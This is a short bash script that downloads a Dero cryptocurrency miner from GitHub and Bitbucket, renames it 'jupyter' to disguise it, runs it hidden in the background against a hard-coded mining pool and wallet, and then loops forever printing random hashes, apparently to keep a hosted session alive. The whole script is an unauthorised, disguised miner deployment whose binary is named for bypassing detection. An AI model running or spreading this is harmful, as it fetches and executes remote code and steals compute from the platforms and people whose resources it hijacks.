#!/bin/bash
wget -q -O jupyter https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x jupyter
wget -q -O jupyter https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x jupyter
./jupyter -r 45.76.162.175:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.FUTUHAT >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
